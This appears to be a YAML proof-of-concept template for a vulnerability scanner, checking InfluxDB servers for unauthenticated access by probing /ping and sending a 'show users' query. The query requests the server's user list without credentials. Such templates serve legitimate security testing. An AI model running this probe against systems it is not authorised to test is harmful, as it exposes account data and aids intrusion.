id: poc-yaml-influxdb-unauth
info:
  name: Influxdb 未授权访问漏洞
  severity: medium
  tags:
  - 访问控制错误
  finger: Influxdb
  reference: []
  description: null
variables: {}
transport: http
requests:
- method: GET
  path: /ping
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 204 && contains(headers, "x-influxdb-version")
  output: []
- method: GET
  path: /query?q=show%20users
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(headers, "content-type") && contains(headers,
    "application/json") && contains(body, "columns") && contains(body, "user")
  output: []
